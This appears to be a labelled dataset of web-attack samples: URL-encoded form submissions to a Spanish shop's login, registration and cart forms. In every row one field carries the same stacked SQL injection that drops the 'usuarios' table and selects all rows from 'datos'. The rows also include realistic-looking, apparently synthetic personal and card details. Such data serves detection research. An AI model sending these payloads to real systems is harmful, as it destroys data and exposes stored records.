source_uid	group	content
10658	Stacked/other	modo=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&login=chaar&pwd=pe4ibl171o&remember=on&B1=Entrar
10676	Stacked/other	modo=insertar';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&precio=7701&B1=Confirmar
10843	Stacked/other	modo=entrar&login=rizzardi&pwd=332G3le8a&remember=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&B1=Entrar
10903	Stacked/other	modo=registro&login=xi-xian9';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&password=p?erspicacidad&nombre=Geraldo&apellidos=Pedrol&email=chalon@ingenelec.gl&dni=10207822P&direccion=C/+Paloma,+197+&ciudad=Laguna+Dalga&cp=47520&provincia=Pontevedra&ntc=3590940446144864&B1=Registrar
10943	Stacked/other	modo=registro&login=daesik2&password=24�58ca1e581&nombre=Panciano&apellidos=Bonitto+Ciraco&email=dorsay.thursby@elrincondelmarmol.pr&dni=51834543H';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&direccion=Cabo+De+Agua,+S/N+&ciudad=Villafranca+de+los+Barros&cp=21240&provincia=Ja�n&ntc=8319637256237029&B1=Registrar
11089	Stacked/other	modo=registro&login=roanne&password=dado&nombre=Amadis&apellidos=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&email=bronchud@chuecafamily.org&dni=86251880V&direccion=Calle+Bucarelli+29,+&ciudad=Hu�neja&cp=02270&provincia=Cuenca&ntc=2669670300165135&B1=Registrar
11159	Stacked/other	modo=registro&login=detlef6';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&password=garr�n&nombre=Vigilio&apellidos=Alcantara+Campanin&email=padamsee@comodindelhogar.no&dni=71599604Y&direccion=C/+San+Xoan+115+&ciudad=Cigu�uela&cp=25737&provincia=Palencia&ntc=7263738765493624&B1=Registrar
11269	Stacked/other	modo=registro&login=suthers&password=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&nombre=Ren�e&apellidos=Aldeta+Marnetti&email=patterson@arrsys.ke&dni=88453156D&direccion=Camino+De+Los+Robles,+8+&ciudad=Caparroso&cp=43694&provincia=Castell�n&ntc=4200323097821168&B1=Registrar
11467	Stacked/other	modo=entrar&login=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&pwd=caLabrotar&remember=on&B1=Entrar
11771	Stacked/other	modo=insertar';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&precio=3532&B1=Pasar+por+caja
11812	Stacked/other	modo=insertar&precio=1063&B1=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
11881	Stacked/other	modo=insertar&precio=4344&B1=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
4812	Stacked/other	id=2&nombre=Jam�n+Ib�rico&precio=85&cantidad=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&B1=A�adir+al+carrito
4870	Stacked/other	modo=entrar';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&login=jeanes&pwd=d�712&remember=on&B1=Entrar
4914	Stacked/other	modo=registro&login=pye&password=59rola9o&nombre=Hermenegilda&apellidos=Lunar+De+Broy&email=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&dni=39171878A&direccion=Pla�a+Rectoria+17+8?A&ciudad=Al�jar&cp=27118&provincia=Salamanca&ntc=5074100981550289&B1=Registrar
4962	Stacked/other	B2=Vaciar+carrito';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
4995	Stacked/other	modo=registro&login=sawyers&password=encUmb2ad3';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&nombre=Max&apellidos=Sj�strand+Ampurias&email=tamburi@hispadis.ar&dni=30293636Z&direccion=C/+Virgen+De+Las+Angustias+122+4?A&ciudad=Fuentespina&cp=48220&provincia=Asturias&ntc=8898020239162472&B1=Registrar
5130	Stacked/other	B2=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
5273	Stacked/other	modo=registro&login=linni&password=892444a9aci8&nombre=Rosario&apellidos=Bagudanc+Robles&email=haumann@maxiwagen.tj&dni=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&direccion=C/+Santa+Beatriz+104,+8D&ciudad=Mingorr�a&cp=42173&provincia=Palencia&ntc=8723970834822268&B1=Registrar
5356	Stacked/other	modo=registro&login=dido&password=enmarch3tar&nombre=Bertilda&apellidos=Deverdun&email=low.feliciano@azkara.sj&dni=19110618X&direccion=Prolongacion+Algeciras+169,+&ciudad=Navarredonda+de+Gredos&cp=18418&provincia=Navarra&ntc=1628195660765454&B1=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
5593	Stacked/other	id=2&nombre=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&precio=100&cantidad=97&B1=A�adir+al+carrito
5623	Stacked/other	modo=registro&login=price&password=enlucimiento&nombre=Roldan&apellidos=Kisines+Selvas&email=sverdlin@cortinasartesol.gl&dni=57845890Q&direccion=Muelle+Ca�onero+Dato,+S/N+6-G&ciudad=Luisiana,+La';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&cp=10811&provincia=Palencia&ntc=1813562312950494&B1=Registrar
5662	Stacked/other	id=2&nombre=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&precio=85&cantidad=18&B1=A�adir+al+carrito
5751	Stacked/other	modo=registro&login=bennet&password=$96c5sa&nombre=Sid&apellidos=Echegoyen+Pazar�n&email=senghor-golling3@24htranslations.ht&dni=16864786J&direccion=Barriada+De+La+Doctora+15+&ciudad=Roa&cp=03610';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&provincia=Valladolid&ntc=0695001148270797&B1=Registrar
5760	Stacked/other	id=1';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
5771	Stacked/other	modo=entrar&login=alvarez&pwd=9ec828';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&remember=on&B1=Entrar
5889	Stacked/other	modo=insertar&precio=8588&B1=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
5906	Stacked/other	modo=registro&login=schoen&password=cartear&nombre=Zaima&apellidos=Falgeras+Puerta&email=hargitay@corjet.coop&dni=33685330J&direccion=Calle+Pedro+Salinas,+15,+6?H';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&ciudad=Bierge&cp=44155&provincia=C�ceres&ntc=2909791700288840&B1=Registrar
5923	Stacked/other	modo=registro&login=essam&password=Cat*ER�tiCA&nombre=Dacil&apellidos=Matamala&email=sabin.prester@sandrasummer.jm';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&dni=65185439N&direccion=C/+Marin+De+Rodezno,+178+&ciudad=Gumiel+de+Mercado&cp=48140&provincia=Badajoz&ntc=9377201272032369&B1=Registrar
6038	Stacked/other	modo=registro&login=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&password=segundar&nombre=Armelio&apellidos=Gochez&email=shankley@discon.sz&dni=25054750E&direccion=C/+Fuente+Del+Rey,+S/N,+&ciudad=Gavilanes&cp=36110&provincia=Salamanca&ntc=2607422784974121&B1=Registrar
6041	Stacked/other	id=1';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&nombre=Jam�n+Ib�rico&precio=100&cantidad=97&B1=A�adir+al+carrito
6203	Stacked/other	errorMsg=Credenciales+incorrectas';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
6384	Stacked/other	modo=registro&login=pascali&password=o73-r1111&nombre=Helidora&apellidos=Estrems&email=cederlund-sol@aulahost.qa&dni=90572791X&direccion=Calle+Urquizu+190+11?F&ciudad=Santa+Magdalena+de+Pulpis&cp=05697&provincia=Zaragoza';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&ntc=3975543619812448&B1=Registrar
6416	Stacked/other	modo=insertar&precio=7744&B1=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
6785	Stacked/other	modo=registro&login=poyi&password=yaro&nombre=Gismundo&apellidos=Ventall�+Tesisteco&email=tamburro@aprendeaestudiar.sj&dni=24987514S&direccion=Travesia+Diego+De+Almagro,+194+&ciudad=Pepino&cp=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&provincia=A+Coru�a&ntc=0040408141488994&B1=Registrar
6910	Stacked/other	modo=registro&login=etoh&password=3Nt783E68r&nombre=Tatiano&apellidos=Renilla+Currius&email=sovagovic@engomera.com.vc&dni=57024590T&direccion=Vera+De+Bidasoa+115,+6?C&ciudad=Lizo�in&cp=10520&provincia=Zamora&ntc=0723351625880614&B1=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
6991	Stacked/other	modo=registro&login=jozef&password=ve9dErse&nombre=Tahiel&apellidos=Ortiz+Narvarte&email=lemontier@viajesnacionales.kp&dni=70721027Y&direccion=Calle+Virgen+De+La+Hoz,+123+4-B&ciudad=Borrass�';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&cp=44564&provincia=Zaragoza&ntc=7002955624204925&B1=Registrar
7179	Stacked/other	modo=entrar&login=mcnair&pwd=81cob6r&remember=off&B1=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
7184	Stacked/other	modo=registro&login=donnelly&password=14a8u19lero&nombre=Alessandra&apellidos=Ricom�+Morato&email=gambold@fok.so&dni=66367222D';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&direccion=Calle+Cavallers+63+&ciudad=Tocina&cp=03729&provincia=Valladolid&ntc=2169388539628734&B1=Registrar
7221	Stacked/other	errorMsg=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
7222	Stacked/other	modo=insertar';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&precio=6072&B1=Pasar+por+caja
7330	Stacked/other	modo=registro&login=swick&password=recalzar&nombre=Amiel&apellidos=Del+Blanco&email=ying-carridine@audiosat.sy&dni=55739537A&direccion=Jose+Cadierno+186,+6F&ciudad=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&cp=37621&provincia=Asturias&ntc=2320151892972616&B1=Registrar
7365	Stacked/other	modo=entrar&login=zaretsky&pwd=725l479zo&remember=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&B1=Entrar
7394	Stacked/other	modo=entrar';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&login=hua-yuan&pwd=*anoria&remember=off&B1=Entrar
7478	Stacked/other	modo=registro&login=brittan&password=al9mb+532&nombre=Onila&apellidos=Furcat+Zarco&email=greiff@opticaweb.bu&dni=36455660Q&direccion=Calle+Nueve+57+';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&ciudad=Utiel&cp=01899&provincia=Madrid&ntc=0088492463086794&B1=Registrar
7484	Stacked/other	id=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
7551	Stacked/other	id=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&nombre=Jam�n+Ib�rico&precio=85&cantidad=21&B1=A�adir+al+carrito
7617	Stacked/other	id=2';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
7724	Stacked/other	id=1&nombre=Queso+Manchego';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&precio=39&cantidad=15&B1=A�adir+al+carrito
7826	Stacked/other	modo=insertar&precio=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&B1=Confirmar
7930	Stacked/other	modo=entrar&login=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&pwd=ensa�ada&remember=on&B1=Entrar
8007	Stacked/other	modo=registro&login=gilly&password=f+emenciar&nombre=Octaviano';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&apellidos=Heredia+Wald&email=meskill_ferlinghetti@wormee.pw&dni=37936735Y&direccion=C/+Ginebre,+98+&ciudad=Manzanillo&cp=33310&provincia=Segovia&ntc=1741584206084308&B1=Registrar
8018	Stacked/other	modo=insertar&precio=8588&B1=Confirmar';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
8053	Stacked/other	modo=registro&login=horak&password=6eSi74osO&nombre=Blas&apellidos=Gasca+Noria&email=dearden@hipermadrid.ga&dni=01101234V&direccion=Avenida+Comunidad+De+Madrid+45,+13C&ciudad=Villarreal+de+Huerva';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&cp=01170&provincia=Girona&ntc=1336518549569700&B1=Registrar
8304	Stacked/other	modo=registro&login=boinnard&password=alARgUEZ&nombre=Celinda&apellidos=Alberti';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&email=moriconi@x2.com.pro&dni=75775962R&direccion=Do�a+Sancha+16,+&ciudad=Montesclaros&cp=46230&provincia=Alicante&ntc=7573620242761583&B1=Registrar
8407	Stacked/other	modo=entrar&login=sydney&pwd=r$aToNESCA&remember=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&B1=Entrar
8448	Stacked/other	id=3';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&nombre=Vino+Rioja&precio=100&cantidad=2&B1=A�adir+al+carrito
8467	Stacked/other	modo=registro&login=bnrecad&password=iN!solUBLe&nombre=Aurelio&apellidos=Ospina+Soma&email=humbert@24htranslations.name&dni=78151636M&direccion=Ramat,+145+5?B&ciudad=Barbastro&cp=31227&provincia=Valladolid&ntc=5175468282615613&B1=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
8470	Stacked/other	modo=registro&login=nettle&password=He�ir&nombre=Rad';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&apellidos=Zalarich+Llufriu&email=duarte@ingenieriadelaconstruccion.vc&dni=47182191Z&direccion=Baza,+55,+&ciudad=Blecua+y+Torres&cp=43151&provincia=Granada&ntc=8375962445368254&B1=Registrar
8617	Stacked/other	modo=entrar&login=hedrich&pwd=chonta&remember=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&B1=Entrar
8696	Stacked/other	modo=insertar';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&precio=6606&B1=Pasar+por+caja
8790	Stacked/other	id=3&nombre=Jam�n+Ib�rico&precio=100&cantidad=74&B1=A�adir+al+carrito';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
8952	Stacked/other	modo=entrar&login=ohio&pwd=acerrador';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&remember=off&B1=Entrar
8986	Stacked/other	modo=registro&login=arco&password=saxosa&nombre=C�sar&apellidos=Nossa+Vizcarrondo&email=kunzer.giorgelli@cochesautomaticos.kn&dni=64841759K&direccion=Calle+Higueras,+37+&ciudad=Uni�n+de+Campos,+La&cp=20130&provincia=Segovia&ntc=1690304707007095&B1=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
9000	Stacked/other	modo=registro&login=raglin&password=m783a1er3&nombre=Careli&apellidos=Navines&email=leclerc6@soycastellano.gl&dni=52316705P';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&direccion=C/+Tavernes+Blanques,+S/N+&ciudad=Rupi�&cp=21610&provincia=Guip�zcoa&ntc=8201185179055303&B1=Registrar
9205	Stacked/other	modo=entrar&login=catlin&pwd=v76c088rA&remember=off';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&B1=Entrar
9299	Stacked/other	modo=registro&login=santitor&password=EnSimiSmaMIenTO&nombre=Lionel&apellidos=Ilizaliturri+Corominas&email=cubelik@deltamarina.th&dni=71111353E&direccion=Rioja+153,+&ciudad=Pe�amellera+Baja&cp=19184';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&provincia=Zamora&ntc=0802143307607123&B1=Registrar
9457	Stacked/other	modo=insertar';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&precio=7191&B1=Confirmar
9554	Stacked/other	id=2&nombre=Queso+Manchego&precio=39&cantidad=76&B1=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%
9645	Stacked/other	id=2&nombre=Jam�n+Ib�rico&precio=39';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&cantidad=90&B1=A�adir+al+carrito
9844	Stacked/other	modo=insertar';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&precio=3714&B1=Confirmar
9936	Stacked/other	modo=registro&login=vinet';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&password=REl+atOr�A&nombre=Ihor&apellidos=Bedos&email=sangareau@faders.com.mil&dni=74830064R&direccion=Santa+Agueda,+S/N+5?G&ciudad=Zarza+de+Mont�nchez&cp=28191&provincia=Ja�n&ntc=9112082229252110&B1=Registrar
9954	Stacked/other	id=2&nombre=Jam�n+Ib�rico';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&precio=100&cantidad=43&B1=A�adir+al+carrito
9955	Stacked/other	id=2&nombre=Jam�n+Ib�rico&precio=100&cantidad=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&B1=A�adir+al+carrito
